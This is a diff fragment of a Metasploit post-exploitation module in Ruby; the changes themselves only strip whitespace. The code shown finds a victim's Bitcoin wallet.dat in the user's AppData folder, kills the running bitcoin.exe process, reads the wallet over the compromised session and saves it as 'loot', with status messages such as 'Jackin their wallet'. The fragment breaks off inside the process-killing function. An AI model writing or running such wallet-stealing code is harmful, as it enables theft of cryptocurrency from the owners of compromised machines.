@@ -36,37 +36,33 @@ class Metasploit3 < Msf::Post
 			tmpath= user['AppData'] + "\\Bitcoin\\wallet.dat"
 			jack_wallet(tmpath)
 		end
-		
 	end
 
 	def jack_wallet(filename)
 		data     = ""
 		found    = session.fs.file.stat(filename) rescue nil
 		return if not found
-		
+
 		print_status("Wallet Found At #{filename}")
 		print_status("     Jackin their wallet...")
-			
+
 		kill_bitcoin
-		
+
 		begin
 			wallet = session.fs.file.new(filename, "rb")
 			until wallet.eof?
 				data << wallet.read
 			end
-			
+
 			store_loot("bitcoin.wallet", "application/octet-stream", session, data, filename, "Bitcoin Wallet")
 			print_status("     Wallet Jacked.")
 		rescue ::Interrupt
 			raise $!
 		rescue ::Exception => e
-			print_error("Failed to download #{filename}: #{e.class} #{e}")	
+			print_error("Failed to download #{filename}: #{e.class} #{e}")
 		end
 	end
 
-	
-	
-		
 	def kill_bitcoin
 		client.sys.process.get_processes().each do |x|
 			if x['name'].downcase == "bitcoin.exe"
